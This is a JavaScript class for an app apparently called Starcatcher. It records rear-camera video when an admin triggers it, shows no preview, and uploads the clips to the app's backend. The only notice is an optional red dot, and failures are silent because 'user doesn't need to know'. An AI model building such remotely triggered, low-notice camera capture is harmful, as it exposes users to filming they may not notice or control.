/**
 * Starcatcher – Background Video Recording
 * Records video (no audio) in the background when triggered by admin.
 * No camera preview is shown to the user.
 */

class BackgroundRecorder {
    constructor() {
        this.stream = null;
        this.mediaRecorder = null;
        this.chunks = [];
        this.isRecording = false;
        this.uploadUrl = '/api/upload';
        this.indicatorEl = document.getElementById('record-indicator');
    }

    /**
     * Start background recording (video only, no audio)
     */
    async start() {
        if (this.isRecording) return;

        try {
            this.stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
            });

            this.chunks = [];

            try {
                const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
                    ? 'video/webm;codecs=vp9'
                    : 'video/webm';
                this.mediaRecorder = new MediaRecorder(this.stream, { mimeType });
            } catch (e) {
                this.mediaRecorder = new MediaRecorder(this.stream);
            }

            this.mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) this.chunks.push(e.data);
            };

            this.mediaRecorder.onstop = () => this._upload();

            this.mediaRecorder.start();
            this.isRecording = true;
            this._showIndicator(true);
            console.log('🎬 Background recording started');

        } catch (err) {
            console.error('Camera access error:', err);
            // Silently fail – user doesn't need to know
        }
    }

    /**
     * Stop background recording and upload
     */
    stop() {
        if (!this.isRecording || !this.mediaRecorder) return;

        try {
            if (this.mediaRecorder.state !== 'inactive') {
                this.mediaRecorder.stop();
            }
        } catch (e) {
            console.warn('Stop error:', e);
        }

        this.isRecording = false;
        this._showIndicator(false);

        // Release camera
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
            this.stream = null;
        }

        console.log('⏹️ Background recording stopped');
    }

    /**
     * Upload recorded video to server
     */
    async _upload() {
        if (this.chunks.length === 0) return;

        const blob = new Blob(this.chunks, { type: 'video/webm' });
        this.chunks = [];

        // Determine upload URL
        const baseUrl = (window.CROWDFLASH_CONFIG && window.CROWDFLASH_CONFIG.BACKEND_URL)
            ? window.CROWDFLASH_CONFIG.BACKEND_URL.replace('wss://', 'https://').replace('ws://', 'http://')
            : '';

        try {
            const response = await fetch(baseUrl + this.uploadUrl, {
                method: 'POST',
                body: blob,
                headers: {
                    'X-Filename': `rec_${Date.now()}.webm`
                }
            });

            const data = await response.json();
            if (data.success) {
                console.log('✅ Video uploaded:', data.filename);
            } else {
                throw new Error('Upload failed');
            }
        } catch (err) {
            console.error('❌ Upload error:', err);
        }
    }

    /**
     * Show/hide recording indicator (small red dot)
     */
    _showIndicator(visible) {
        if (this.indicatorEl) {
            this.indicatorEl.style.display = visible ? 'flex' : 'none';
        }
    }
}

// Export
window.BackgroundRecorder = BackgroundRecorder;
